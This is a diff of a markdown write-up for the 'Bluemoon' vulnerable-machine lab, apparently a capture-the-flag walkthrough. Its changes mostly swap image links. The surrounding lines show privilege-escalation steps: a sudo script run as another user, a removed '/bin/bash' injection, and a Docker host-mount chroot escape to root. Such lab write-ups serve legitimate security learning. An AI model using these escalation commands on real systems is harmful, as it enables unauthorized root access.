@@ -95,8 +95,6 @@ cat user1.txt
 
 sudo -u jerry /home/robin/project/feedback.sh
 
-/bin/bash
-
 ![Jerry](https://github.com/izzulharith02/Week-2---Vulnerable-Machine-Bluemoon/blob/234f8ef23ec188102d8e926b482b15e26fae5312/bluemoon%208.png)
 
 cat user2.txt
@@ -109,11 +107,9 @@ cat user2.txt
 
 id
 
-![Docker](images/docker.png)
-
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 
-![Root Access](images/root-access.png)
+![Root Access](https://github.com/izzulharith02/Week-2---Vulnerable-Machine-Bluemoon/blob/d5a5b6ad27ce0ba451ce2443498d3f6d40f46b39/bluemoon%208-2.png)
 
 whoami
 
